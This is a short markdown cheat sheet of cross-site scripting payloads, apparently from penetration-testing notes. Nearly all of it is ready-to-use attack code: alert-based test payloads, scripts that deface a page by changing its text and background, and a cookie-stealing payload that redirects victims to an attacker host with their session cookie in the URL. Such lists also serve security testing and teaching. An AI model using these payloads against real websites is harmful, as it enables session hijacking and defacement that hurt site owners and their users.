# XSS payloads

[Cross-Site Scripting](https://owasp.org/www-community/attacks/xss/) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.

## Basic XSS test payloads
```html
<script>alert(1)</script>

<script>alert(document.domain)</script>

<script>alert(windows.origin)</script>

<script>alert(window.localStorage)</script>

<script>alert(window.document.cookie)</script>

<script>alert(String.fromCharCode(0x58,0x53,0x53))</script>
```

## Deface HTML
```html
<!--change text -->
<script>document.querySelector('#id').textContent = 'new'</script>

<!--change background color-->
<script>document.body.style.backgroundColor = "red"</script>
```
## Steal Cookie
```html
<script>window.location='http://attacker/?cookie='+document.cookie</script>
```